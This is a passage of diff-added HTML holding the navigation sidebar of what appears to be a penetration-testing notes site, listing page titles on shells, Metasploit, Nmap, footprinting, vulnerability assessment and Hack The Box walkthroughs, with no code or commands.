+  <span class="md-ellipsis">
+    Anatomy of a shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/bind_shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bind shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/reverseshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reverseshell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/Payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/Infiltrating-Unix-Linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Infiltrating Unix Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/SpawningInteractiveShells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SpawningInteractiveShells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/Laudanum%2C%20One%20Webshell%20to%20Rule%20Them%20All/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Laudanum, One Webshell to Rule Them All
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/skillAssessment/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    skillAssessment
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/DetectionAndPrevention/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Detection &amp; Prevention Summary
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Metasploit
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Metasploit/Preface/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Preface
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tools
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            Tools
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/onesixtyone/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    onesixtyone
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Braa/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Braa
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/WinRM/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WinRM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Shodan/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shodan
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/xfreerdp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Xfreerdp
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Nessus/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nessus
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Metasploit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Nikto/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nikto
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Rsync/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Rsync
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/snmpwalk/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    snmpwalk
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Windows_Management_Instrumentation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Management Instrumentation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/vnStat/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    vnStat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/DNSenum/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNSenum
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/OpenVAS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OpenVAS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/File%20Transfer%20tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Transfer tools
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/JtR/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    John the Ripper (JtR) Comprehensive Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Certutil/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Certutil
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/ssti/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    A Pentester's Guide to Server-Side Template Injection (SSTI)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Powershell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Powershell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Nmap
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            Nmap
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Firewall%20and%20IDS%20IPS%20Evasion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Firewall and IDS IPS Evasion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nmap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Service%20Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Service Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/nse/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NSE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Cheatsheet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cheatsheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Host%20and%20Port%20Scanning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Host and Port Scanning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Saving%20the%20Result/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Saving the Result
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Performance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Performance
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Nmap%20Host%20Discovery/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nmap Host Discovery
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Attacking%20Network%20Services/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Attacking Network Services
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Info Gathering Web Edition
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_7">
+            <span class="md-nav__icon md-icon"></span>
+            Info Gathering Web Edition
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Penetration Testing Process
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_8" id="__nav_2_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Footprinting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_8">
+            <span class="md-nav__icon md-icon"></span>
+            Footprinting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/SNMP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SNMP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/NFS%20Network%20File%20System/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NFS Network File System
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SMTP Simple Mail Transfer Protocol
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/DNS%20Domain%20Name%20System/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Domain%20Information/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain Information
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Cloud%20Resources/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cloud Resources
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/FTP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    FTP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/MYSQL/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MYSQL
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Windows%20Remote%20Management%20Protocols/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Remote Management Protocols
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Enumeration%20Methodology/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumeration Methodology
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/MSSQL/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSSQL
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Enumeration%20Principles/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumeration Principles
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/IMAP POP3.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    None
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Linux%20Remote%20Management%20Protocols/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux Remote Management Protocols
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Oracle - TNS Transparent Network Substate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/SMB/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SMB
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/IPMI Intelligent Platform Management Interface.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    None
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_9" id="__nav_2_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Skill Assessment
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_9">
+            <span class="md-nav__icon md-icon"></span>
+            Skill Assessment
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Hard/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Footprinting Lab   Hard
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Skill%20Assessment/Footprinting_Lab_Meduim/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Footprinting Lab Meduim
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Easy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Footprinting Lab   Easy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_10" id="__nav_2_10_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Vulnerability
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_10">
+            <span class="md-nav__icon md-icon"></span>
+            Vulnerability
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Vulnerabilities and Exposures (CVE)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Common%20Vulnerability%20Scoring%20System%20%28CVSS%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Vulnerability Scoring System (CVSS)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Assessment%20Standards/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Assessment Standards
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Getting%20Started%20with%20Nessus/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Getting Started with Nessus
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Vulnerability%20Assessment/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Vulnerability Assessment
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    HTB
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            HTB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Easy
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Easy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/Blunder/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blunder Walkthrough
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/broadlight/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Broadlight
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/busqueda/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Busqueda
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/sense/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sense
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/postman/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Postman
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/legacy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Legacy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/Bashed/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bashed
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/Beep/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Beep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/Buff/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Buff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Meduim
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Meduim
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/meduim/active/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/meduim/jeeves/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Jeeves
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Hard
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Hard
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/hard/hard/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hard
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
